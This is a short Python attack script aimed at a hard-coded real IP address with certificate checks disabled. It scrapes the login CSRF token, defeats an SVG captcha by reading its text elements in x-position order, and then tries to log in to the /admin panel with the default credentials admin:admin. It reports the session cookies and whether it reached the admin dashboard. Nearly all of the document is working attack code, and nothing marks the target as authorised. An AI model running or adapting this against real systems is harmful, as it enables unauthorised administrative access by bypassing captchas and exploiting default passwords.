#!/usr/bin/env python3
"""
Extract captcha from SVG and solve login
"""

import requests
import re
import time

TARGET = "https://210.69.42.55"
sess = requests.Session()
sess.verify = False

# Get login page and extract token
login_page = sess.get(f"{TARGET}/admin/login").text
token_match = re.search(r'name="_token" value="([^"]+)"', login_page)
if token_match:
    token = token_match.group(1)
    print(f"[+] Token: {token}")

# Get captcha SVG
captcha_svg = sess.get(f"{TARGET}/admin/captcha").text
print(f"[+] Captcha SVG length: {len(captcha_svg)}")

# Extract text from SVG - find all <text> elements and sort by x position
text_matches = re.findall(r'<text[^>]*x="(\d+)"[^>]*>([A-Z0-9]+)</text>', captcha_svg)
if text_matches:
    # Sort by x position
    text_matches.sort(key=lambda x: int(x[0]))
    captcha = ''.join([t[1] for t in text_matches])
    print(f"[+] Captcha: {captcha}")
else:
    # Fallback: try to find text directly
    text_matches = re.findall(r'>([A-Z0-9]+)</text>', captcha_svg)
    if text_matches:
        captcha = ''.join(text_matches)
        print(f"[+] Captcha (fallback): {captcha}")
    else:
        print("[-] Could not extract captcha")
        captcha = "ABCD1"  # fallback

# Attempt login
print(f"\n[*] Attempting login with admin:admin, captcha={captcha}")
login_data = {
    "_token": token,
    "username": "admin",
    "password": "admin",
    "captcha": captcha
}

resp = sess.post(f"{TARGET}/admin/login", data=login_data, allow_redirects=False)
print(f"[+] Response status: {resp.status_code}")
print(f"[+] Location: {resp.headers.get('Location', 'N/A')}")
print(f"[+] Cookies: {dict(sess.cookies)}")

# Check session
dashboard = sess.get(f"{TARGET}/admin/home")
if "419" in dashboard.text:
    print("[-] Session expired")
else:
    print("[+] Session active")
    # Look for admin-specific content
    if "admin" in dashboard.text.lower():
        print("[+] Found admin content in page")